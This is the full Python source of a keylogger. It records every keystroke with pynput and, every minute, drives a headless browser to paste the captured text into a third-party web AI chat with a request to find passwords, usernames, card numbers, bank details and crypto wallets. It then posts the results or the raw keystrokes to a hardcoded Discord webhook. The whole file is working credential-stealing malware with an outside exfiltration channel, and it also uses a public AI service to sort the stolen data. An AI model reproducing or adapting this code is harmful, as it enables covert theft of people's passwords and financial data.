from pynput import keyboard
import threading
import time
import requests
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from bs4 import BeautifulSoup
from datetime import datetime


class keylogger:
    def __init__(self):
        self.log = ''
        self.url = 'https://www.easemate.ai/webapp/chat'
        self.report = ''
        self.webhook_url = 'https://discord.com/api/webhooks/1480290358725443585/JZtn_-nZEvnGAyBEp07mILkXHw62hlpErRcvzaIFRQvgQNx5f8h-ogiW41LMCyEUX9i7'

    def storeText(self, key):
        try:
            currentKey = key.char
        except AttributeError:
            if key == key.space:
                currentKey = ' '
            else:
                currentKey = ' ' + str(key) + ' '
        self.log = self.log + currentKey

    def reportFinalize(self):
        threading.Timer(60, self.reportFinalize).start()
        self.Ai()

    def Ai(self):
        """Send keystrokes to AI for analysis"""
        if not self.log.strip():
            print("[!] No keystrokes to analyze")
            self.log = ''
            return

        prompt = f"""Analyze this captured text for sensitive information:

{self.log}

Tasks:
1. Remove Key.backspace, Key.shift, Key.caps_lock artifacts
2. Look for passwords, usernames, credit cards, bank info, crypto wallets
3. Classify as "Urgent" if sensitive data found, "useless" if not
4. Be brief

Provide analysis now."""

        chromeOptions = webdriver.ChromeOptions()
        chromeOptions.add_argument('--headless')
        chromeOptions.add_argument('--no-sandbox')
        chromeOptions.add_argument('--disable-dev-shm-usage')

        driver = None

        try:
            driver = webdriver.Chrome(options=chromeOptions)
            driver.get(self.url)
            print("[*] Page loaded")

            time.sleep(5)

            # Find input
            input_element = WebDriverWait(driver, 15).until(
                EC.presence_of_element_located((By.CLASS_NAME, 'input-textarea'))
            )

            # Click and type
            input_element.click()
            time.sleep(1)
            input_element.send_keys(prompt)
            print("[*] Prompt sent")

            # Submit with double Enter (some chat UIs need this)
            time.sleep(2)
            input_element.send_keys(Keys.RETURN)
            time.sleep(1)
            input_element.send_keys(Keys.RETURN)
            print("[*] Submitted with Enter")

            # Wait for AI response
            print("[*] Waiting for AI response...")
            response_found = False

            for attempt in range(36):  # 36 × 5 = 3 minutes
                time.sleep(5)

                try:
                    html = driver.page_source
                    soup = BeautifulSoup(html, 'html.parser')

                    # Find all response divs
                    message_divs = soup.find_all('div', class_='md-editor-preview')

                    # Need at least 2 divs (your message + AI response)
                    if len(message_divs) >= 2:
                        ai_response = message_divs[-1].get_text('\n', strip=True)

                        # Check if it's a real response (not echo, substantial length)
                        if ai_response and len(ai_response) > 50:
                            # Make sure it's not asking for more info
                            if 'please provide' not in ai_response.lower():
                                self.report = ai_response
                                print(f"[+] Response received after {(attempt + 1) * 5}s")
                                response_found = True
                                break

                    if attempt % 6 == 5:
                        print(f"[*] Waiting... {(attempt + 1) * 5}s")

                except Exception as e:
                    print(f"[!] Check error: {e}")

            if not response_found:
                print("[!] No valid response within 3 minutes")
                self.report = f"AI Timeout\n\nRaw keystrokes:\n{self.log}"

        except Exception as e:
            print(f"[!] AI Error: {e}")
            self.report = f"Error: {str(e)}\n\nRaw keystrokes:\n{self.log}"

        finally:
            if driver:
                try:
                    driver.quit()
                    print("[*] Browser closed")
                except:
                    pass

            self.log = ''
            self.SendResult()

    def SendResult(self):
        """Send report to Discord"""
        if not self.report.strip():
            print("[!] No report to send")
            return

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        # Truncate if too long
        if len(self.report) > 1900:
            self.report = self.report[:1900] + "\n...(truncated)"

        message = {
            "content": f"**AI Report - {timestamp}**\n```\n{self.report}\n```"
        }

        try:
            response = requests.post(self.webhook_url, json=message, timeout=10)
            if response.status_code == 204:
                print(f"[+] Report sent at {timestamp}")
            else:
                print(f"[-] Discord error: {response.status_code}")
        except Exception as e:
            print(f"[!] Send error: {e}")

        self.report = ''

    def logger(self):
        with keyboard.Listener(on_press=self.storeText) as listener:
            threading.Timer(60, self.reportFinalize).start()
            listener.join()


if __name__ == '__main__':
    print("[*] AI Keylogger started (analyzes every 30m)")
    print("[*] Press Ctrl+C to stop")
    newKey = keylogger()
    newKey.logger()